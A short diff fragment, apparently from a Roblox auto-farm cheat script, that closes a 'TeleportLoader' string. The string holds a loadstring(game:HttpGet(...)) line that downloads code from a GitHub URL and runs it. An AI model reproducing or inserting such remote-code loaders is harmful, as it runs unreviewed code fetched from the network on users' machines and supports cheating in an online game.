@@ -4571,6 +4571,7 @@ library.AutoFarm = {
     TransitionKey = "RUNAWAYS_AUTO_FARM_TRANSITION",
     TeleportLoader = [[
 loadstring(game:HttpGet("https://raw.githubusercontent.com/labubu316/Viva-g-fxcxgcvchchchcg/refs/heads/main/Aaaaa?cb=" .. tostring(os.time())))()
+]], 
     Running = false,
     ResumeRequested = false,
     Token = nil,
